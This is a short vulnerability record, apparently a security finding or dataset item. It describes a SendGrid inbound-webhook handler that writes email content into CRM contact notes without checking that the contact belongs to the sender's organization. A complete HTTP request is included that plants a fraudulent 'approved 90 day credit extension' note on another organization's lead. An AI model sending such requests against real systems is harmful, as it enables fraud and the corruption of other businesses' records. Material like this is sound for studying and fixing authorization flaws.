diagnosis: The SendGrid inbound email parser verifies webhook cryptographic signatures, but writes the incoming email thread directly into CRM contact notes using contact_id from the payload without verifying that the sender address or recipient domain belongs to the organization managing that CRM contact record. An attacker can inject unsolicited communications and fraudulent notes into competitor CRM contacts.
exploit_request:
POST /webhooks/sendgrid/inbound HTTP/1.1
Host: crm.salesplatform.com
X-Twilio-Email-Event-Webhook-Signature: valid_sendgrid_signature==
X-Twilio-Email-Event-Webhook-Timestamp: 1690000100
Content-Type: application/json

{"email": "infiltrator@spoofed.com", "to": "support@salesplatform.com", "contact_id": "crm_lead_448102", "subject": "Credit Terms", "text": "Client approved 90 day credit extension."}
